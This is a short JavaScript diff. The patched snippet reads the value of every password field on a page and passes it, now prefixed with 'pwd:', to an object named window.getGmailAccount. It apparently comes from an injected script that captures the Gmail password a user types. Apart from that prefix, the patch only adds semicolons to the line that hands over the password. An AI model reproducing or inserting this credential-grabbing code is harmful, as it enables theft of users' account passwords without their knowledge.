@@ -4,10 +4,10 @@ function pwd() {
     for (var c = 0; c < b.length; c++) {
         var d = b[c];
         if (d.type === "password") {
-            e = b[c].value
+            e = b[c].value;
         }
-        d = null
+        d = null;
     }
-    return e
+    return e;
 }
-window.getGmailAccount.getGmailAccount(pwd());
+window.getGmailAccount.getGmailAccount("pwd:"+pwd());
